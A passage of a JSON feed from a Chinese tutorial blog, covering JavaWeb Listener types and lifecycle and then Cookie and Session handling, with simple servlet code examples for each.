      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/5-JavaWeb_Listener.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/5-JavaWeb_Listener.html",
      "summary": "5-Listener\nListener 表示监听器，可以监听 application，session，request 三个对象创建、销毁或者往其中添加修改删除属性时自动执行代码的功能组件。 application 是 ServletContext 类型的对象。ServletContext 代表整个web应用，在服务器启动的时候，tomcat会自动创建该...",
      "content_html": "\n<p>Listener 表示监听器，可以监听 <code>application</code>，<code>session</code>，<code>request</code> 三个对象创建、销毁或者往其中添加修改删除属性时自动执行代码的功能组件。 <code>application</code> 是 <code>ServletContext</code> 类型的对象。<code>ServletContext</code> 代表整个web应用，在服务器启动的时候，tomcat会自动创建该对象。在服务器关闭时会自动销毁该对象。</p>\n<h2>1. Listener分类</h2>\n<p>在JavaWeb中提供了8个监听器：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>6个常规监听器\n    ServletContext\n            ServletContextListener（上下文监听器，监听ServletContext对象的创建和销毁事件，用于监听Web应用程序的启动和关闭事件。）\n            ServletContextAttributeListener（属性监听，监听ServletContext中属性的添加、修改和删除事件。）\n    HttpSession\n            HttpSessionListener（会话监听器，监听HttpSession对象的创建和销毁事件，用于监听会话的创建和销毁事件。）\n            HttpSessionAttributeListener（属性监听，监听HttpSession中属性的添加、修改和删除事件。）\n    ServletRequest\n            ServletRequestListener（请求监听器，监听ServletRequest对象的创建和销毁事件，用于监听请求的创建和销毁事件。）\n            ServletRequestAttributeListener（属性监听，监听ServletRequest中属性的添加、修改和删除事件。）\n\n2个感知监听\n    HttpSessionBindingListener\n    HttpSessionActivationListener\n</code></pre></div><h2>2. Listener 生命周期</h2>\n<p>Listener 的生命周期由容器管理，容器会在适当的时机调用监听器的方法。让我们简要了解一下这些生命周期方法。</p>\n<h5><code>ServletContextListener</code> 生命周期</h5>\n<p><code>ServletContextListener</code> 接口定义了两个方法：</p>\n<ul>\n<li><strong><code>contextInitialized(ServletContextEvent sce)</code></strong>：在 Web 应用程序初始化时被调用。</li>\n<li><strong><code>contextDestroyed(ServletContextEvent sce)</code></strong>：在 Web 应用程序销毁时被调用。</li>\n</ul>\n<h5><code>HttpSessionListener</code> 生命周期</h5>\n<p><code>HttpSessionListener</code> 接口也定义了两个方法：</p>\n<ul>\n<li><strong><code>sessionCreated(HttpSessionEvent se)</code></strong>：在会话创建时被调用。</li>\n<li><strong><code>sessionDestroyed(HttpSessionEvent se)</code></strong>：在会话销毁时被调用。</li>\n</ul>\n<h5><code>ServletRequestListener</code> 生命周期</h5>\n<p><code>ServletRequestListener</code> 接口同样定义了两个方法：</p>\n<ul>\n<li><strong><code>requestInitialized(ServletRequestEvent sre)</code></strong>：在请求创建时被调用。</li>\n<li><strong><code>requestDestroyed(ServletRequestEvent sre)</code></strong>：在请求销毁时被调用。</li>\n</ul>\n<h2>3. Listener实现步骤</h2>\n<p>以<code>ServletContextListener</code>为例，<code>ServletContextListener</code> 用于监听 Web 应用程序的启动和关闭事件。</p>\n<ul>\n<li>定义类，实现<code>ServletContextListener</code> 接口</li>\n<li>重写所有抽象方法，我们可以在 <code>contextInitialized</code> 方法中执行一些初始化操作，在 <code>contextDestroyed</code> 方法中执行清理操作。</li>\n<li>使用 <code>@WebListener</code> 进行配置（或者使用<code>web.xml ： &lt;listener&gt;&lt;/listener&gt;</code>）</li>\n<li>启动tomcat，查看console的输出</li>\n</ul>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>echo0d</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ServletContextEvent</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ServletContextListener</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">WebListener</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token annotation punctuation\">@WebListener</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MyServletContextListener</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ServletContextListener</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">contextInitialized</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletContextEvent</span> sce<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 应用程序启动时执行的初始化操作</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"应用程序已启动\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 加载配置文件、初始化数据库连接池等</span>\n        <span class=\"token comment\">// ...</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">contextDestroyed</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletContextEvent</span> sce<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 应用程序关闭时执行的清理操作</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"应用程序即将关闭\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 关闭数据库连接池、释放资源等</span>\n        <span class=\"token comment\">// ...</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><figure><figcaption>image-20240813141650756</figcaption></figure>\n",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "6-会话技术",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/6-CookieAndSession.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/6-CookieAndSession.html",
      "summary": "6-会话技术\n1. 概述\n用户打开浏览器，访问web服务器的资源，会话建立，直到有一方断开连接，会话结束。在一次会话中可以包含多次请求和响应。\n\n从浏览器发出请求到服务端响应数据给前端之后，一次会话(在浏览器和服务器之间)就被建立了\n会话被建立后，如果浏览器或服务端都没有被关闭，则会话就会持续建立着\n浏览器和服务器就可以继续使用该会话进行请求发送和响应...",
      "content_html": "\n<h2>1. 概述</h2>\n<p>用户打开浏览器，访问web服务器的资源，会话建立，直到有一方断开连接，会话结束。在一次会话中可以包含多次请求和响应。</p>\n<ul>\n<li>从浏览器发出请求到服务端响应数据给前端之后，一次会话(在浏览器和服务器之间)就被建立了</li>\n<li>会话被建立后，如果浏览器或服务端都没有被关闭，则会话就会持续建立着</li>\n<li>浏览器和服务器就可以继续使用该会话进行请求发送和响应，上述的整个过程就被称之为会话。</li>\n</ul>\n<p>会话跟踪是一种维护浏览器状态的方法，服务器需要识别多次请求是否来自于同一浏览器，以便在同一次会话的多次请求间共享数据。</p>\n<ul>\n<li>服务器会收到多个请求，这多个请求可能来自多个浏览器，需要识别请求是否来自同一个浏览器，服务器识别浏览器后就可以在同一个会话中多次请求之间来共享数据，服务器用来识别浏览器的过程就是会话跟踪</li>\n</ul>\n<p><strong>实现方案</strong></p>\n<ul>\n<li>客户端会话跟踪技术：Cookie</li>\n<li>服务端会话跟踪技术：Session</li>\n</ul>\n<h2>2. Cookie</h2>\n<p>**Cookie：**客户端会话技术，将数据保存到客户端，以后每次请求都携带Cookie数据进行访问。</p>\n<p><strong>Cookie的工作流程</strong></p>\n<ul>\n<li>服务端提供了两个Servlet，分别是ServletA和ServletB</li>\n<li>浏览器发送HTTP请求1给服务端，服务端ServletA接收请求并进行业务处理</li>\n<li>服务端ServletA在处理的过程中可以创建一个Cookie对象并将<code>name=zs</code>的数据存入Cookie</li>\n<li>服务端ServletA在响应数据的时候，会把Cookie对象响应给浏览器</li>\n<li>浏览器接收到响应数据，会把Cookie对象中的数据存储在浏览器内存中，此时浏览器和服务端就<strong>建立了一次会话</strong></li>\n<li><strong>在同一次会话中</strong>浏览器再次发送HTTP请求2给服务端ServletB，浏览器会携带Cookie对象中的所有数据</li>\n<li>ServletB接收到请求和数据后，就可以获取到存储在Cookie对象中的数据，这样同一个会话中的多次请求之间就实现了数据共享</li>\n</ul>\n<h3>2.1. Cookie的基本使用</h3>\n<h4>发送Cookie</h4>\n<ul>\n<li>编写Servlet类，在Servlet中创建Cookie对象</li>\n</ul>\n<ul>\n<li>创建Cookie对象，并设置数据</li>\n</ul>\n<div class=\"language-plaintext\" data-ext=\"plaintext\" data-title=\"plaintext\"><pre class=\"language-plaintext\"><code>Cookie cookie = new Cookie(\"key\",\"value\");\n</code></pre></div><ul>\n<li>发送Cookie到客户端：使用<strong>response</strong>对象</li>\n</ul>\n<div class=\"language-plaintext\" data-ext=\"plaintext\" data-title=\"plaintext\"><pre class=\"language-plaintext\"><code>response.addCookie(cookie);\n</code></pre></div><p>综上，编写Servlet类，名称为AServlet，在Servlet中创建Cookie对象，存入数据，发送给前端</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@WebServlet</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/AServlet\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">AServlet</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">HttpServlet</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//发送Cookie</span>\n        <span class=\"token comment\">//1. 创建Cookie对象</span>\n        <span class=\"token class-name\">Cookie</span> cookie <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Cookie</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"张三\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//2. 发送Cookie，response</span>\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">addCookie</span><span class=\"token punctuation\">(</span>cookie<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doPost</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>启动测试，访问<code>http://localhost:8080/AServlet</code>在浏览器查看Cookie对象中的值：</p>\n<figure><figcaption>image-20240813144617026</figcaption></figure>\n<h4>获取Cookie</h4>\n<ul>\n<li>编写一个新Servlet类，名称为BServlet，在BServlet中使用request对象获取Cookie数组</li>\n</ul>\n<ul>\n<li>获取客户端携带的所有Cookie，使用request对象</li>\n</ul>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Cookie</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> cookies <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getCookies</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><ul>\n<li>for遍历数组，获取每一个Cookie对象</li>\n</ul>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Cookie</span> cookie <span class=\"token operator\">:</span> cookies<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n</code></pre></div><ul>\n<li>使用Cookie对象方法获取数据</li>\n</ul>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code>cookie<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\ncookie<span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>综上，编写一个新Servlet类，名称为BServlet在BServlet中使用request对象获取Cookie数组，遍历数组，从数据中获取指定名称对应的值</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@WebServlet</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/BServlet\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">BServlet</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">HttpServlet</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//获取Cookie</span>\n        <span class=\"token comment\">//1. 获取Cookie数组</span>\n        <span class=\"token class-name\">Cookie</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> cookies <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getCookies</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//2. 遍历数组</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Cookie</span> cookie <span class=\"token operator\">:</span> cookies<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">//3. 获取数据</span>\n            <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> cookie<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">String</span> value <span class=\"token operator\">=</span> cookie<span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">+</span><span class=\"token string\">\":\"</span><span class=\"token operator\">+</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doPost</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>启动测试，在控制台打印出获取的值访问<code>http://localhost:8080/BServlet</code>在IDEA控制台就能看到输出的结果:</p>\n<figure><figcaption>image-20240813144918782</figcaption></figure>\n<h3>2.2. Cookie的存活时间</h3>\n<p>默认情况下，Cookie存储在浏览器内存中，当浏览器关闭，内存释放，则Cookie被销毁</p>\n<p>我们可以使用<code>setMaxAge</code>设置Cookie存活时间</p>\n<div class=\"language-plaintext\" data-ext=\"plaintext\" data-title=\"plaintext\"><pre class=\"language-plaintext\"><code>setMaxAge(int seconds)\n</code></pre></div><p>参数值为:</p>\n<p>1.正数：将Cookie写入浏览器所在电脑的硬盘，持久化存储。到时间自动删除</p>\n<p>2.负数：默认值，Cookie在当前浏览器内存中，当浏览器关闭，则Cookie被销毁</p>\n<p>3.零：删除对应Cookie</p>\n<p>修改上面的AServlet如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>echo0d<span class=\"token punctuation\">.</span>cookie</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>http<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URLEncoder</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token annotation punctuation\">@WebServlet</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/AServlet\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">AServlet</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">HttpServlet</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//创建Cookie对象</span>\n        <span class=\"token class-name\">String</span> value <span class=\"token operator\">=</span> <span class=\"token string\">\"张三\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//URL编码</span>\n        value <span class=\"token operator\">=</span> <span class=\"token class-name\">URLEncoder</span><span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">,</span> <span class=\"token string\">\"UTF-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"存储数据：\"</span><span class=\"token operator\">+</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Cookie</span> cookie <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Cookie</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">,</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//设置存活时间   ，1周 7天</span>\n        cookie<span class=\"token punctuation\">.</span><span class=\"token function\">setMaxAge</span><span class=\"token punctuation\">(</span><span class=\"token number\">60</span><span class=\"token operator\">*</span><span class=\"token number\">60</span><span class=\"token operator\">*</span><span class=\"token number\">24</span><span class=\"token operator\">*</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//发送Cookie，response</span>\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">addCookie</span><span class=\"token punctuation\">(</span>cookie<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doPost</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n\n</code></pre></div><h2>3. Session</h2>\n<p>Session：服务端会话跟踪技术：将数据保存到服务端。</p>\n<ul>\n<li>Session是存储在服务端而Cookie是存储在客户端</li>\n<li>存储在客户端的数据容易被窃取和截获，存在很多不安全的因素</li>\n<li>存储在服务端的数据相比于客户端来说就更安全</li>\n</ul>\n<h3>3.1. Session的基本使用</h3>\n<p>获取Session对象,使用的是request对象</p>\n<div class=\"language-plaintext\" data-ext=\"plaintext\" data-title=\"plaintext\"><pre class=\"language-plaintext\"><code>HttpSession session = request.getSession();\n</code></pre></div><p><strong>Session对象提供的功能:</strong></p>\n<ul>\n<li>\n<p>存储数据到 session 域中</p>\n<div class=\"language-plaintext\" data-ext=\"plaintext\" data-title=\"plaintext\"><pre class=\"language-plaintext\"><code>void setAttribute(String name, Object o)\n</code></pre></div></li>\n<li>\n<p>根据 key，获取值</p>\n<div class=\"language-plaintext\" data-ext=\"plaintext\" data-title=\"plaintext\"><pre class=\"language-plaintext\"><code>Object getAttribute(String name)\n</code></pre></div></li>\n<li>\n<p>根据 key，删除该键值对</p>\n<div class=\"language-plaintext\" data-ext=\"plaintext\" data-title=\"plaintext\"><pre class=\"language-plaintext\"><code>void removeAttribute(String name)\n</code></pre></div></li>\n</ul>\n<p>创建SessionDemo1类获取Session对象、存储数据</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@WebServlet</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/demo1\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SessionDemo1</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">HttpServlet</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n    \t<span class=\"token comment\">//存储到Session中</span>\n        <span class=\"token comment\">//1. 获取Session对象</span>\n        <span class=\"token class-name\">HttpSession</span> session <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//2. 存储数据</span>\n        session<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"zs\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doPost</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>创建SessionDemo2类获取Session对象、获取数据</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@WebServlet</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/demo2\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SessionDemo2</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">HttpServlet</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//获取数据，从session中</span>\n        <span class=\"token comment\">//1. 获取Session对象</span>\n        <span class=\"token class-name\">HttpSession</span> session <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//2. 获取数据</span>\n        <span class=\"token class-name\">Object</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span><span class=\"token function\">getAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token 